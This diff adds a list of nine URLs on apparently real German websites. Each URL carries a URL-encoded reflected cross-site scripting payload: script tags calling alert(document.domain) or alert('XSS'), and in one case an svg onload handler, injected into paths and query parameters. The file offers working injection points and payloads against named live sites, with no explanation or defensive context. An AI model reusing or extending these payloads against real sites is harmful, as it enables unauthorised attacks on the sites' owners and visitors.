@@ -1,0 +1,9 @@
+http://bns-systems.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://boarisch-gredt-gsunga-gspuit.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://bobbooks.de/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x
+http://bochum-einkaufen.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://board.splash.de/php/passport/index.php?action=manage&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mtype=userset
+https://bobenheimroxheim-anzeiger.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://bocholt-anzeiger.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://bochumhordel-suche.de/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+https://boeblingen-blog.de/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
